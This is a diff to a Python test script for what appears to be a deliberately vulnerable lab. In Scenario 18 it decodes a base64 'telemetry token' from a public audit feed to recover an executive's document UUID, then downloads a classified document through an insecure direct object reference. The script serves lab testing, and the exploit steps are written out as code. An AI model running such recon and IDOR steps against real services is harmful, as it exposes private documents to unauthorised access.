@@ -7,6 +7,7 @@ import os
 import sys
 import re
 import base64
+import json
 import requests
 
 FAILURES = []
@@ -335,14 +336,17 @@ def main():
     print("\n--- [Scenario 18] Port 8018: Obfuscated & UUID Leakage IDOR ---")
     try:
         s18 = requests.Session()
-        # Step 1: Recon public activity feed to discover leaked UUID
+        # Step 1: Recon public activity feed to discover obfuscated telemetry token
         r18_feed = s18.get(f"http://{HOST}:8018/api/public/audit-feed", timeout=3).json()
         target_uuid = None
         for item in r18_feed.get("feed", []):
             if item.get("actor") == "Chief Security Officer":
-                target_uuid = item.get("doc_uuid")
+                token = item.get("telemetry_token")
+                if token:
+                    decoded = json.loads(base64.b64decode(token).decode("utf-8"))
+                    target_uuid = decoded.get("doc_uuid")
                 break
-        check("S18: Leaked executive document UUID discovered in audit feed", target_uuid is not None)
+        check("S18: Leaked executive document UUID recovered from decoded telemetry", target_uuid is not None)
 
         # Step 2: Download classified document via IDOR
         r18_doc = s18.get(f"http://{HOST}:8018/api/documents/download?doc_id={target_uuid}", timeout=3).json()
